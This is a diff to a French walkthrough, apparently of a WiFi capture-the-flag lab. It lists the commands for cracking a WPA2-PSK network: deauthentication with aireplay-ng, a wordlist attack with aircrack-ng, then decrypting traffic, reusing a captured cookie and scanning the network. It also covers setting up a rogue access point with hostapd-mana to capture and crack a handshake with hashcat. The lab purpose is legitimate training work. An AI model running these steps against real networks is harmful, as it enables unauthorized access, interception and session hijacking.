@@ -120,7 +120,104 @@ Connexion :
      wpa_supplicant -D nl80211 -i wlan2 -c /etc/wpa_supplicant/wep.conf
      sudo dhclient wlan1 -v
 
+### 3) WPA2 PSK
 
+#### Obtenir le mot de passe de "wifi-mobile"
+
+Capture : 
+
+    sudo su
+    airmon-ng check kill
+    airmon-ng start wlan0
+    airodump-ng wlan0mon -w psk --manufacturer --wps --band abg
+    airodump-ng wlan0mon -w psk --manufacturer --wps --band abg -c 6
+    
+
+Désauthentification : 
+
+    aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon
+    
+
+Bruteforcing de la clé : 
+
+    aircrack-ng psk-01.cap -w ~/rockyou-top100000.txt
+
+
+#### Obtenir l'IP du serveur web dans ce réseau
+
+Utilisation de airdecap-ng pour déchiffrer le trafic, grâce à la clé précédemment obtenue : 
+
+    airdecap-ng -e wifi-mobile -p starwars1 psk-01.cap
+    
+Analyse du trafic déchiffré avec Wireshark : 
+
+    wireshark psk-01-dec.cap
+
+#### Se connecter au site web et trouver le flag
+
+Connexion avec wpa_supplicant : 
+
+    wpa_supplicant -Dnl80211 -iwlan3 -c psk_1.conf
+    dhclient wlan3 -v
+
+Contenu de psk_1.conf :
+
+    network={
+        ssid="wifi-mobile"
+        psk="starwars1"
+        scan_ssid=1
+        key_mgmt=WPA-PSK
+        proto=WPA2
+    }
+
+Une fois sur le site, utiliser le cookie trouvé dans Wireshark.
+
+#### Exploiter le manque d'isolation de ce réseau
+
+Utilisation de l'outil arp-scan pour trouver l'IP du deuxième serveur web :
+
+    arp-scan -I wlan3 -l
+    curl 192.168.2.9
+    
+    
+### 4) WPA2 PSK - Réseau distant à usurper
+
+#### Trouver le mot de passe de "wifi-offices"
+
+Le réseau "wifi-offices" n'est pas dans la liste initiale, mais on voit quelques communications avec lui apparaître avec airodump-ng : 
+
+
+     (not associated)   B4:99:BA:6F:F9:45  -49    0 - 6     81      273         wifi-offices,Jason                                          
+     (not associated)   78:C1:A7:BF:72:46  -49    0 - 6     84      280         wifi-offices,Jason 
+
+
+Soit il est à un autre endroit, soit il a été coupé. 
+
+Utilisation de hostapd-mana pour créer un faux point d'accès : 
+
+    hostapd-mana wifi-offices.conf
+    
+Contenu de wifi-offices.conf : 
+
+    interface=wlan1
+    driver=nl80211
+    hw_mode=g
+    channel=1
+    ssid=wifi-offices
+    mana_wpaout=hostapd.hccapx
+    wpa=2
+    wpa_key_mgmt=WPA-PSK
+    wpa_pairwise=TKIP CCMP
+    wpa_passphrase=12345678
+
+
+Faire un Ctrl+C pour couper l'outil dès que l'on voit la ligne suivante : 
+
+> AP-STA-POSSIBLE-PSK-MISMATCH
+
+Bruteforcing du handshake : 
+
+    hashcat -a 0 -m 2500 hostapd.hccapx ~/rockyou-top100000.txt --force
     
 
     
